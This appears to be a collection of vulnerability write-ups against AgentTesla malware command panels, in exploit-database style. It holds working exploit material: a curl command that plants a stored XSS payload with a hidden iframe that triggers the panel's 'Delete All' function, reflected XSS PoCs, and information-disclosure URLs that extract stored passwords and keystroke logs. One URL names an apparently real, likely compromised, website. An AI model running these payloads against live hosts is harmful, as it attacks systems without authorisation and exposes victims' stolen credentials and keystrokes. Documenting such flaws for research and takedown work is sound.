


Type: Permissions

Author: [karttoon](https://twitter.com/noottrak)

The screenshot directory is not properly secured on AgentTesla panels. Each underlying folder is the HWID of an infected machine (of note for the XSS vulnerability below).

```
hxxp://example[.]com/badguy/Panel/Screens/
hxxp://example[.]com/badguy/Panel/Screens/1234-ABCD-5678-EF01-9ABC-2345-DEF0-6789/ScreenShots/2017_01_02_03_04_05.jpeg
```
Type: XSS vulnerability

Author: [karttoon](https://twitter.com/noottrak)

Once the root of the panel is identified (eg if you saw hxxp://example[.]com/badguy/Panel/post.php, the root is /badguy/Panel/) you can exploit the fact that the AgentTesla panel will directly inject HTML into its database for display to the operator once they view the expanded entry. The trick is convincing them to expand the entry, so you need to use a valid HWID for an infected system and a lure they can't resist. Below example truncates to "[clipboard]credit card d..." and will use XSS to redirect the admin to the "Delete All" function for the data.

```
curl hxxp://example[.]com/badguy/Panel/phost.php --data 'type=keylog&hwid=1234-ABCD-5678-EF01-9ABC-2345-DEF0-6789&time=2017-01-02 03:04:05&pcname=Administrator&logdata=%3Cfont%20color%3D%23FF0000%3E%5Bclipboard%5D%3C%2Ffont%3Ecredit%20card%20details%20are%20below%20with%20password%20p%40%24%24w0rd%3Cfont%20color%3D%23FF0000%3E%5Bclipboard%5D%3C%2Ffont%3E%3Cbr%3E%3Ciframe%20src%3D%22http%3A%2F%2Fexample[.]com%2Fbadguy%2FPanel%2Fdeleteall.php%22%20style%3D%22visibility%3A%20hidden%3B%22%3E%3C%2Fiframe%3E&screen=&ipadd=&webcam_link=&client=&link=&username=&password=&screen_link='
```




Type: Cross Site Scripting Vulnerability

Vuln: http://localhost/WebPanel/pages/get-log.php?title=[XSS]

Author: n4pst3r

```
################################
# Exploit Title: Agent Tesla Botnet - Cross Site Scripting Vulnerability
# Exploit Author: n4pst3r
# Vendor Homepage: unkn0wn
# Software Link: http://www.agenttesla.com/ ¡ Down !
# Version: unkn0wn
# Tested on: Windows 10, debian 7
# CVE : n/a
################################
# Vuln-Code: http://127.0.0.1/WebPanel/pages/get-log.php
                      /get-screens.php
                      /get-webcams.php

<?php echo $_GET['title']; ?>

################################
PoC:

http://127.0.0.1/WebPanel/pages/get-log.php?title=[XSS]
                 /get-screens.php?title=[XSS]
                 /get-webcams.php?title=[XSS]
```





Type: Information Disclosure Disclosure Vulnerability

Vuln: http://localhost/WebPanel/server_side/scripts/server_processing.php?table=passwords&primary=password_id&clmns=a%3A6%3A%7Bi%3A0%3Ba%3A2%3A%7Bs%3A2%3A%22db%22%3Bs%3A11%3A%22server_time%22%3Bs%3A2%3A%22dt%22%3Bs%3A11%3A%22server_time%22%3B%7Di%3A1%3Ba%3A2%3A%7Bs%3A2%3A%22db%22%3Bs%3A7%3A%22pc_name%22%3Bs%3A2%3A%22dt%22%3Bs%3A7%3A%22pc_name%22%3B%7Di%3A2%3Ba%3A2%3A%7Bs%3A2%3A%22db%22%3Bs%3A6%3A%22client%22%3Bs%3A2%3A%22dt%22%3Bs%3A6%3A%22client%22%3B%7Di%3A3%3Ba%3A2%3A%7Bs%3A2%3A%22db%22%3Bs%3A4%3A%22host%22%3Bs%3A2%3A%22dt%22%3Bs%3A4%3A%22host%22%3B%7Di%3A4%3Ba%3A2%3A%7Bs%3A2%3A%22db%22%3Bs%3A8%3A%22username%22%3Bs%3A2%3A%22dt%22%3Bs%3A8%3A%22username%22%3B%7Di%3A5%3Ba%3A2%3A%7Bs%3A2%3A%22db%22%3Bs%3A3%3A%22pwd%22%3Bs%3A2%3A%22dt%22%3Bs%3A3%3A%22pwd%22%3B%7D%7D

Author: n4pst3r

```
################################
# Exploit Title: Agent Tesla Botnet - Information Disclosure Disclosure Vulnerability
# Exploit Author: n4pst3r
# Vendor Homepage: unkn0wn
# Software Link: http://www.agenttesla.com/ ¡ Down !
# Version: unkn0wn
# Tested on: Windows 10, debian 7
# CVE : n/a
# Greetz: Shell.root, Griever, Telibles
################################
# Vuln-Code: http://127.0.0.1/WebPanel/server_side/scripts/server_processing.php

$table = $_GET['table'];

// Table's primary key
$primaryKey = $_GET['primary'];

if(isset($_GET['where'])){
  $where = base64_decode($_GET['where']);
}else{
  $where = "";
}

$idArray = unserialize(urldecode($_GET['clmns']));

################################
PoC Extract full passwords:
http://127.0.0.1/WebPanel/server_side/scripts/server_processing.php?table=passwords&primary=password_id&clmns=a%3A6%3A%7Bi%3A0%3Ba%3A2%3A%7Bs%3A2%3A%22db%22%3Bs%3A11%3A%22server_time%22%3Bs%3A2%3A%22dt%22%3Bs%3A11%3A%22server_time%22%3B%7Di%3A1%3Ba%3A2%3A%7Bs%3A2%3A%22db%22%3Bs%3A7%3A%22pc_name%22%3Bs%3A2%3A%22dt%22%3Bs%3A7%3A%22pc_name%22%3B%7Di%3A2%3Ba%3A2%3A%7Bs%3A2%3A%22db%22%3Bs%3A6%3A%22client%22%3Bs%3A2%3A%22dt%22%3Bs%3A6%3A%22client%22%3B%7Di%3A3%3Ba%3A2%3A%7Bs%3A2%3A%22db%22%3Bs%3A4%3A%22host%22%3Bs%3A2%3A%22dt%22%3Bs%3A4%3A%22host%22%3B%7Di%3A4%3Ba%3A2%3A%7Bs%3A2%3A%22db%22%3Bs%3A8%3A%22username%22%3Bs%3A2%3A%22dt%22%3Bs%3A8%3A%22username%22%3B%7Di%3A5%3Ba%3A2%3A%7Bs%3A2%3A%22db%22%3Bs%3A3%3A%22pwd%22%3Bs%3A2%3A%22dt%22%3Bs%3A3%3A%22pwd%22%3B%7D%7D

PoC Extract full Keystrokes:
http://etvidanueva.com/photos/images/WebPanel/server_side/scripts/server_processing.php?table=logs&primary=log_id&clmns=a%3A6%3A%7Bi%3A0%3Ba%3A2%3A%7Bs%3A2%3A%22db%22%3Bs%3A6%3A%22log_id%22%3Bs%3A2%3A%22dt%22%3Bs%3A6%3A%22log_id%22%3B%7Di%3A1%3Ba%3A2%3A%7Bs%3A2%3A%22db%22%3Bs%3A11%3A%22server_time%22%3Bs%3A2%3A%22dt%22%3Bs%3A11%3A%22server_time%22%3B%7Di%3A2%3Ba%3A2%3A%7Bs%3A2%3A%22db%22%3Bs%3A4%3A%22hwid%22%3Bs%3A2%3A%22dt%22%3Bs%3A4%3A%22hwid%22%3B%7Di%3A3%3Ba%3A2%3A%7Bs%3A2%3A%22db%22%3Bs%3A7%3A%22pc_name%22%3Bs%3A2%3A%22dt%22%3Bs%3A7%3A%22pc_name%22%3B%7Di%3A4%3Ba%3A2%3A%7Bs%3A2%3A%22db%22%3Bs%3A3%3A%22log%22%3Bs%3A2%3A%22dt%22%3Bs%3A3%3A%22log%22%3B%7Di%3A5%3Ba%3A2%3A%7Bs%3A2%3A%22db%22%3Bs%3A9%3A%22ip_addres%22%3Bs%3A2%3A%22dt%22%3Bs%3A9%3A%22ip_addres%22%3B%7D%7D
``````